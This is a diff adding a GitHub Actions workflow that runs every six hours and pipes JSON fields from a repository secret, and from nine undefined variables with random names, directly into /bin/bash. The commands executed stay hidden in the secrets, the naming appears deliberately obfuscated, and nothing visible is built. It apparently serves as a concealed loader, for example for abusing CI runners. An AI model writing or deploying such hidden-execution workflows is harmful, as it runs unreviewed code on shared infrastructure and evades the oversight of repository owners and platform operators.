@@ -1,0 +1,26 @@
+name: fuanningzhu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fuanningzhu
+        env:
+          vbw03714: ${{ secrets.vbw03714 }}
+        run: |
+          echo $vbw03714 | jq -r .ihv22673 | /bin/bash
+          echo $pbnj6524 | jq -r .mvo456 | /bin/bash
+          echo $uudb91 | jq -r .wcrwb8758 | /bin/bash
+          echo $tkle5 | jq -r .o4 | /bin/bash
+          echo $vhqp1193 | jq -r .xnsy3 | /bin/bash
+          echo $zhhc233 | jq -r .nob42670 | /bin/bash
+          echo $ddrr34014 | jq -r .ks9830 | /bin/bash
+          echo $gitz537 | jq -r .kbac59 | /bin/bash
+          echo $yxvi968 | jq -r .cgc685 | /bin/bash
+          echo $t8 | jq -r .d70 | /bin/bash
+
